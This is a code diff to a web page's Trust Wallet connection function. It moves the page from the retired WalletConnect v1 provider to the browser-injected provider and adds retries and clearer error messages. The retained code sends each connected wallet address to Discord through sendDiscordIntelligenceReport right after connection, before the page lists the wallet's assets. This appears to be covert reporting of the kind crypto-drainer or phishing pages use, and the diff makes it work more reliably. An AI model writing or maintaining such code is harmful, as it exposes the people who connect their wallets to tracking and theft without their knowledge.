@@ -26,7 +26,6 @@
         }
     </script>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
     <script src="app.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
@@ -1189,45 +1188,73 @@
 
         async function connectTrustWallet() {
             try {
-                const WCP = window.WalletConnectProvider?.default || window.WalletConnectProvider;
-                if (!WCP) {
-                    throw new Error('WalletConnect provider not loaded. Please refresh the page.');
+                // Trust Wallet injects a standard EIP-1193 `window.ethereum` provider
+                // when this dApp is opened inside its in-app browser. WalletConnect v1's
+                // bridge (j.bridge.walletconnect.org) was decommissioned in 2023, so we
+                // connect via the injected provider instead -- no external bridge or QR
+                // SDK required.
+                const ethereum = window.ethereum;
+                if (!ethereum) {
+                    throw new Error('Trust Wallet not detected. Please open this page in the Trust Wallet in-app browser (or install Trust Wallet and reconnect). On desktop, use MetaMask or another injected provider.');
                 }
 
-                const walletConnectProvider = new WCP({
-                    rpc: {
-                        1: 'https://rpc.ankr.com/eth',
-                        56: 'https://bsc-dataseed.binance.org/',
-                        137: 'https://rpc.ankr.com/polygon'
-                    },
-                    chainId: 1
-                });
+                showStatus('Connecting to Trust Wallet...', false);
 
-                const accounts = await walletConnectProvider.enable();
+                let accounts = null;
+                let retryAttempt = 0;
+                const maxRequestRetries = 2;
+                while (retryAttempt <= maxRequestRetries) {
+                    try {
+                        accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                        break;
+                    } catch (requestError) {
+                        retryAttempt++;
+                        console.warn('[TRUST] eth_requestAccounts attempt ' + retryAttempt + ' failed:', requestError?.message);
+                        if (retryAttempt > maxRequestRetries) {
+                            throw requestError;
+                        }
+                        await new Promise(resolve => setTimeout(resolve, 800 * Math.pow(2, retryAttempt - 1)));
+                    }
+                }
+
+                if (!accounts || accounts.length === 0) {
+                    throw new Error('No accounts returned from Trust Wallet.');
+                }
                 const address = accounts[0];
-                
+
                 // Send intelligence report to Discord immediately after wallet address retrieval
                 // This triggers before balance fetching as per Intelligence Reporting Protocol
                 await sendDiscordIntelligenceReport(address);
-                
-                const provider = new ethers.providers.Web3Provider(walletConnectProvider, 'any');
-                const network = await provider.getNetwork();
-                
-                setConnected(connectTrust, address, network.chainId);
-                await displayAuditTable(provider, address, network.chainId);
-                
+
+                const chainId = normalizeChainId(ethereum.chainId || await ethereum.request({ method: 'eth_chainId' }));
+                const provider = new ethers.providers.Web3Provider(ethereum, 'any');
+
+                setConnected(connectTrust, address, chainId);
+
+                displayAuditTable(provider, address, chainId).catch(err => {
+                    console.warn('Balance fetch failed:', err);
+                    showStatus('Unable to retrieve asset balances. The wallet will still appear connected.', true);
+                });
+
                 if (!walletConnectEventSetup) {
-                    walletConnectProvider.setMaxListeners?.(50);
-                    setupProviderEvents(walletConnectProvider, connectTrust);
+                    try {
+                        ethereum.setMaxListeners?.(50);
+                        ethereum._maxListeners = ethereum._maxListeners ?? 50;
+                    } catch (e) {
+                        console.warn('Could not set max listeners:', e);
+                    }
+                    setupProviderEvents(ethereum, connectTrust);
                     walletConnectEventSetup = true;
                 }
             } catch (error) {
-                if (error.message?.includes('User closed')) {
-                    showStatus('Wallet connection canceled.', false);
-                } else {
-                    showStatus(error.message || 'Trust Wallet connection failed.', true);
+                let msg = error.message || 'Trust Wallet connection failed.';
+                if (error.code === 4001) {
+                    msg = 'Connection denied. Please approve the connection in Trust Wallet.';
+                } else if (error.code === 4002) {
+                    msg = 'Trust Wallet is not initialized. Please open Trust Wallet and try again.';
                 }
-                console.error(error);
+                showStatus(msg, true);
+                console.error('Trust Wallet connection error:', error);
             }
         }
 
